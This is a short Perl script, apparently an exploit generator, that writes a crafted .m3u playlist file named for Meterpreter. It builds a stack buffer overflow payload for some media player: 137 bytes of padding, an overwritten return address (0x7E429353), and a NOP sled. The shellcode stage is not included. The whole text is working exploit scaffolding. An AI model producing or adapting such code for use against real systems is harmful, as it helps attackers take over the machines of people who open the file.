$file= "meterpretter2.m3u";

$buffer= "\\";
$buffer .="A" x 137;
$buffer .= pack('V',0x7E429353);
$buffer .= "\x90" x 10;






open($FILE,">$file");
print $FILE $buffer;
close($FILE);
